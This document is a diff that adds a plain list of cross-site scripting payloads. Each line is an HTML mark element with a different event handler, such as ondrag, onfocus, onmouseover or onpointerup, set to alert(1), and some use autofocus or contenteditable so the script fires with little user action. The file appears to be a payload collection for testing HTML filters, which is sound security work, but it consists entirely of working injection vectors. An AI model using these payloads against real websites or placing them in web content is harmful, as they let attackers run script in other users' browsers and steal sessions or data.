@@ -1,0 +1,43 @@
+<mark draggable="true" ondrag="alert(1)">test</mark>
+<mark draggable="true" ondragend="alert(1)">test</mark>
+<mark draggable="true" ondragenter="alert(1)">test</mark>
+<mark draggable="true" ondragleave="alert(1)">test</mark>
+<mark draggable="true" ondragstart="alert(1)">test</mark>
+<mark id=x tabindex=1 onactivate=alert(1)></mark>
+<mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>
+<mark id=x tabindex=1 onbeforedeactivate=alert(1)></mark><input autofocus>
+<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>
+<mark id=x tabindex=1 onfocus=alert(1)></mark>
+<mark id=x tabindex=1 onfocusin=alert(1)></mark>
+<mark onafterscriptexecute=alert(1)><script>1</script>
+<mark onbeforecopy="alert(1)" contenteditable>test</mark>
+<mark onbeforecut="alert(1)" contenteditable>test</mark>
+<mark onbeforepaste="alert(1)" contenteditable>test</mark>
+<mark onbeforescriptexecute=alert(1)><script>1</script>
+<mark onblur=alert(1) tabindex=1 id=x></mark><input autofocus>
+<mark onclick="alert(1)">test</mark>
+<mark oncontextmenu="alert(1)">test</mark>
+<mark oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<mark oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<mark ondblclick="alert(1)" autofocus tabindex=1>test</mark>
+<mark onfocusout=alert(1) tabindex=1 id=x></mark><input autofocus>
+<mark onkeydown="alert(1)" contenteditable>test</mark>
+<mark onkeypress="alert(1)" contenteditable>test</mark>
+<mark onkeyup="alert(1)" contenteditable>test</mark>
+<mark onmousedown="alert(1)">test</mark>
+<mark onmouseenter="alert(1)">test</mark>
+<mark onmouseleave="alert(1)">test</mark>
+<mark onmousemove="alert(1)">test</mark>
+<mark onmouseout="alert(1)">test</mark>
+<mark onmouseover="alert(1)">test</mark>
+<mark onmouseup="alert(1)">test</mark>
+<mark onmousewheel=alert(1)>requires scrolling
+<mark onpaste="alert(1)" contenteditable>test</mark>
+<mark onpointerdown=alert(1)>XSS</mark>
+<mark onpointerenter=alert(1)>XSS</mark>
+<mark onpointerleave=alert(1)>XSS</mark>
+<mark onpointermove=alert(1)>XSS</mark>
+<mark onpointerout=alert(1)>XSS</mark>
+<mark onpointerover=alert(1)>XSS</mark>
+<mark onpointerrawupdate=alert(1)>XSS</mark>
+<mark onpointerup=alert(1)>XSS</mark>
